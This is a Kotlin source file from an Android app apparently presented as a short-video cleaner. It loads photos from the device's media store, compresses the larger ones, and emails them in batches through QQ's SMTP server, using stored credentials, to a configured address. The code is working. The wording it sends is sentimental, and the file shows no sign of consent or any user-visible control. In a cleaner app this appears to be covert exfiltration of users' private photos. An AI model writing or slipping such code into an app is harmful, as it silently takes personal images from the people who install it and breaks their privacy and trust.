package com.shortvideocleaner.app

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.provider.MediaStore
import android.webkit.MimeTypeMap
import com.shortvideocleaner.app.PhotoSendManager.PhotoEntry
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream
import java.util.Properties
import javax.activation.DataHandler
import javax.activation.DataSource
import javax.mail.Authenticator
import javax.mail.Message
import javax.mail.PasswordAuthentication
import javax.mail.Session
import javax.mail.Transport
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeBodyPart
import javax.mail.internet.MimeMessage
import javax.mail.internet.MimeMultipart
import javax.mail.util.ByteArrayDataSource

object PhotoSender {

    private const val MAX_WIDTH = 800
    private const val JPEG_QUALITY = 65
    private const val COMPRESS_THRESHOLD = 1 * 1024 * 1024L // 1MB

    suspend fun sendBatch(context: Context, batch: List<PhotoEntry>): Boolean =
        withContext(Dispatchers.IO) {
            try {
                val email = SmtpSender.getEmail(context)
                val authCode = SmtpSender.getAuthCode(context)

                val props = Properties().apply {
                    put("mail.smtp.host", "smtp.qq.com")
                    put("mail.smtp.port", "465")
                    put("mail.smtp.auth", "true")
                    put("mail.smtp.ssl.enable", "true")
                    put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory")
                    put("mail.smtp.socketFactory.fallback", "false")
                    put("mail.smtp.connectiontimeout", "20000")
                    put("mail.smtp.timeout", "30000")
                }

                val session = Session.getInstance(props, object : Authenticator() {
                    override fun getPasswordAuthentication() =
                        PasswordAuthentication(email, authCode)
                })

                val message = MimeMessage(session).apply {
                    setFrom(InternetAddress(email))
                    setRecipient(Message.RecipientType.TO, InternetAddress(email))
                    setSubject("📷 我们的回忆 (${batch.size} 张)")
                }

                val multipart = MimeMultipart()

                // 说明文本
                val textPart = MimeBodyPart().apply {
                    setText("翻开相册，一起看看我们一起走过的日子…\n\n共 ${batch.size} 张照片")
                }
                multipart.addBodyPart(textPart)

                // 照片附件
                for ((idx, photo) in batch.withIndex()) {
                    val bytes = loadAndCompress(context, photo)
                    if (bytes != null) {
                        val imgPart = MimeBodyPart().apply {
                            // 判断是否为压缩后的照片
                            val isCompressed = photo.size > COMPRESS_THRESHOLD
                            val mimeType: String
                            val fileExt: String
                            
                            if (isCompressed) {
                                // 压缩后的照片使用JPEG格式
                                mimeType = "image/jpeg"
                                fileExt = "jpg"
                            } else {
                                // 原图保持原始格式
                                val ext = photo.path.substringAfterLast('.', "jpg").lowercase()
                                mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext) ?: "image/jpeg"
                                fileExt = ext
                            }
                            
                            val ds: DataSource = ByteArrayDataSource(bytes, mimeType)
                            dataHandler = DataHandler(ds)
                            fileName = "photo_${idx + 1}.$fileExt"
                        }
                        multipart.addBodyPart(imgPart)
                    }
                }

                message.setContent(multipart)
                Transport.send(message)
                true
            } catch (e: Exception) {
                android.util.Log.e("PhotoSender", "发送失败: ${e.message}")
                false
            }
        }

    private fun loadAndCompress(context: Context, photo: PhotoEntry): ByteArray? {
        return try {
            val uri = android.net.Uri.parse("${MediaStore.Images.Media.EXTERNAL_CONTENT_URI}/${photo.id}")
            
            // 如果照片大小不超过1MB，直接读取原图字节
            if (photo.size <= COMPRESS_THRESHOLD) {
                val input = context.contentResolver.openInputStream(uri) ?: return null
                val bytes = input.readBytes()
                input.close()
                return bytes
            }
            
            // 超过1MB的照片进行压缩处理
            val input = context.contentResolver.openInputStream(uri) ?: return null

            val options = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            BitmapFactory.decodeStream(input, null, options)
            input.close()

            val sampleSize = calculateSampleSize(options.outWidth, options.outHeight, MAX_WIDTH)
            val opts = BitmapFactory.Options().apply { inSampleSize = sampleSize }
            val input2 = context.contentResolver.openInputStream(uri) ?: return null
            val bitmap = BitmapFactory.decodeStream(input2, null, opts)
            input2.close()

            if (bitmap == null) return null

            // 如果还是太大，进一步缩放
            val scaled: Bitmap = if (bitmap.width > MAX_WIDTH) {
                val ratio = MAX_WIDTH.toFloat() / bitmap.width
                val newH = (bitmap.height * ratio).toInt()
                val b = Bitmap.createScaledBitmap(bitmap, MAX_WIDTH, newH, true)
                if (b != bitmap) bitmap.recycle()
                b
            } else bitmap

            val bos = ByteArrayOutputStream()
            scaled.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, bos)
            if (scaled != bitmap) scaled.recycle()

            bos.toByteArray()
        } catch (e: Exception) {
            null
        }
    }

    private fun calculateSampleSize(w: Int, h: Int, maxSize: Int): Int {
        var size = 1
        while (w / size > maxSize || h / size > maxSize) size *= 2
        return size.coerceAtLeast(1)
    }
}
